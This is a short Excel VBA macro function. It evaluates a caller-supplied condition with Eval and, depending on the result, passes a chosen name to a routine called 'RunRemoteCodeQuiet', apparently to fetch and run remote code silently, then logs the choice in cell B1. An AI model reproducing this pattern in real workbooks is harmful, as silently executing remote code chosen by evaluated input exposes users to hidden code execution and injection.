Public Function DynamicFunc(targetWb As Workbook, param As Variant) As Object
    Dim parts() As String : parts = Split(CStr(param), "|", 3)
    Dim cond As String : cond = Trim$(parts(0))
    Dim modA As String : modA = IIf(UBound(parts) >= 1, Trim$(parts(1)), "")
    Dim modB As String : modB = IIf(UBound(parts) >= 2, Trim$(parts(2)), "")
    Dim ok As Boolean : ok = Eval(cond)
    Dim chosen As String : chosen = IIf(ok, modA, modB)
    If Len(chosen) > 0 Then Application.Run "zInternet.RunRemoteCodeQuiet", chosen
    Dim ws As Worksheet : Set ws = targetWb.Sheets(1) : ws.Range("A1").Value = "Calistirilan" : ws.Range("B1").Value = chosen
    Set DynamicFunc = Nothing
End Function
